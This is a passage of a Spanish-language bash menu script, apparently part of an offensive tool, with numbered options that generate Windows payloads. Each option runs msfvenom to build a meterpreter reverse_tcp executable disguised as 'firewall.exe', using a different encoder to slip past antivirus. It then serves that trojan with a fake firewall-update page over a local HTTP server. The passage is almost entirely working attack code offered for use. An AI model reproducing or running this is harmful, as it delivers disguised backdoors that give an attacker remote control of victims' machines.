echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
21)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_upper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
22)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/alpha_mixed -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
23)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/add_sub -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
24)
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/zutto_dekiru -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
25)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $ "  lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_dynamic -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
26)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor_context -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
27)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x64/xor -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  Puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  Sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
esac
